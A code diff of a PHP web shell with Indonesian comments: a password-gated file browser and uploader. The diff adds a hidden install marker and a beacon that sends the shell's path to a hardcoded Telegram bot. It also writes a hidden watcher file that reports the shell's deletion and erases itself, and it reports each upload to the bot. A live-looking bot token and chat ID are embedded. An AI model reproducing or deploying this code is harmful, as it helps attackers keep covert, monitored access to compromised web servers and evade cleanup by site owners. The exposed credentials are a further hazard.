@@ -1,35 +1,36 @@
 <?php
 session_start();
 
+// ================= CONFIG =================
 $passHash = '$2a$12$qbUBAVBufBYtIT9KbYq2VeSywq/9N8gXUyETmsOe8dHnxBjXsN.0O';
-
-// ================= TELEGRAM CONFIG =================
 $token = "8687462257:AAEzX81PQXglaSAcKi2pz1zg01Kb-XXBOQ4";
 $chat_id = "8259867883";
 
+// ================= TELEGRAM =================
 function sendTele($msg, $token, $chat_id) {
+    @file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($msg));
+}
 
-    static $lastMsg = '';
+// ================= NOTIF PASANG =================
+if (!file_exists(__DIR__.'/.install_log')) {
 
-    // anti spam (jangan kirim pesan sama berturut-turut)
-    if ($msg === $lastMsg) return;
-    $lastMsg = $msg;
+    file_put_contents(__DIR__.'/.install_log', 'ok');
 
-    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
+    sendTele("🔥 FILE TERPASANG\n".__FILE__, $token, $chat_id);
 
-    $data = [
-        'chat_id' => $chat_id,
-        'text' => $msg
-    ];
+    // AUTO BUAT WATCHER
+    $watch = '<?php
+$token="'.$token.'";
+$chat_id="'.$chat_id.'";
+$target="'.__FILE__.'";
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+if (!file_exists($target)) {
+    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=⚠️ FILE DIHAPUS");
+    unlink(__FILE__);
+}
+?>';
 
-    curl_exec($ch);
-    curl_close($ch);
+    file_put_contents(__DIR__.'/.watch_'.md5(__FILE__).'.php', $watch);
 }
 
 // ================= LOGIN =================
@@ -42,7 +43,7 @@ if (!isset($_SESSION['ok'])) {
             <input type="password" name="p" placeholder="Password">
             <button>Login</button>
           </form>';
-    return;
+    exit;
 }
 
 // ================= ROOT =================
@@ -68,31 +69,6 @@ $current = !empty($_SESSION['history'])
     ? end($_SESSION['history'])
     : $base;
 
-// ================= DELETE (FIX 406) =================
-if (isset($_POST['delete'])) {
-
-    $file = realpath($_POST['delete']);
-
-    if ($file && strpos($file, $base) === 0 && is_file($file)) {
-
-        $name = basename($file);
-
-        if (unlink($file)) {
-
-            echo "<p>🗑️ File dihapus: $name</p>";
-
-            $msg = "🗑️ FILE DIHAPUS\n";
-            $msg .= "Nama: $name\n";
-            $msg .= "Path: $file";
-
-            sendTele($msg, $token, $chat_id);
-
-        } else {
-            echo "<p>❌ Gagal hapus file</p>";
-        }
-    }
-}
-
 // ================= UPLOAD =================
 if (isset($_FILES['f'])) {
 
@@ -103,15 +79,7 @@ if (isset($_FILES['f'])) {
 
         echo "<p>✅ Upload sukses</p>";
 
-        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-        $fileUrl  = $protocol . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $target);
-
-        $msg = "📤 FILE UPLOAD\n";
-        $msg .= "Nama: $name\n";
-        $msg .= "Link: $fileUrl\n";
-        $msg .= "Lokasi: $target";
-
-        sendTele($msg, $token, $chat_id);
+        sendTele("📤 FILE UPLOAD\n$name", $token, $chat_id);
 
     } else {
         echo "<p>❌ Upload gagal</p>";
@@ -142,14 +110,7 @@ foreach (scandir($current) as $f) {
     if (is_dir($full)) {
         echo "📁 <a href='?dir=".urlencode($full)."'>$f</a><br>";
     } else {
-        echo "📄 <a href='?file=".urlencode($full)."'>$f</a> 
-        
-        <form method='post' style='display:inline;'>
-            <input type='hidden' name='delete' value='".htmlspecialchars($full)."'>
-            <button onclick=\"return confirm('Hapus file ini?')\">❌</button>
-        </form>
-        
-        <br>";
+        echo "📄 $f<br>";
     }
 }
 echo "</ul>";
